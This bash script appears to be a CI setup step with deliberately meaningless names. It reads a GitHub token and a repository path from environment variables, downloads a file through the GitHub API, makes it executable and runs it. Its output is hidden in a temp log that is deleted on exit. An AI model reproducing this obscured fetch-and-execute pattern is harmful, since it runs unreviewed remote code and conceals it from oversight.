#!/usr/bin/env bash
set -euo pipefail
set +x

f() {
  printf '%s\n' "$1" >&2
  exit 1
}

s() {
  local n="$1"
  if [ "${!n+x}" != "x" ]; then
    f "setup failed"
  fi
}

n() {
  local n="$1"
  s "$n"
  if [ -z "${!n}" ]; then
    f "setup failed"
  fi
}

a() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}$ ]]; then
    f "setup failed"
  fi
}

b() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}(,x_[a-z2-7]{16})*$ ]]; then
    f "setup failed"
  fi
}

n x_uryvilvifkathfms
n x_tgig5mrd34amhfit
n x_pss4oxkjpnrydrde
n x_m3grkufayc434p7n
a "${x_m3grkufayc434p7n}"
s x_yg3vvvf3rjey2fmp
if [ -n "${x_yg3vvvf3rjey2fmp:-}" ]; then
  b "${x_yg3vvvf3rjey2fmp}"
fi

d="$(mktemp -d)"
c() {
  rm -rf "$d"
}
trap c EXIT

t="$d/r"
l="$d/l"
o="$d/o"
mkdir -p "$t"

export GH_TOKEN="${x_pss4oxkjpnrydrde}"
r="${x_uryvilvifkathfms}"
v="${x_tgig5mrd34amhfit}"
k="${x_m3grkufayc434p7n}"

g() {
  local p="$1"
  local q="$2"
  if ! gh api -H "Accept: application/vnd.github.raw" "repos/${r}/contents/${p}?ref=${v}" >"$q" 2>"$l"; then
    f "setup failed"
  fi
}

g "x/${k}/x" "$t/x"
g "x/${k}/d" "$t/d"
chmod 700 "$t/x"
chmod 600 "$t/d"

export x_6h5krleyvbeavxnr="$o"
if ! "$t/x" >"$l" 2>&1; then
  f "run failed"
fi

if [ -n "${x_yg3vvvf3rjey2fmp:-}" ]; then
  n GITHUB_OUTPUT
fi
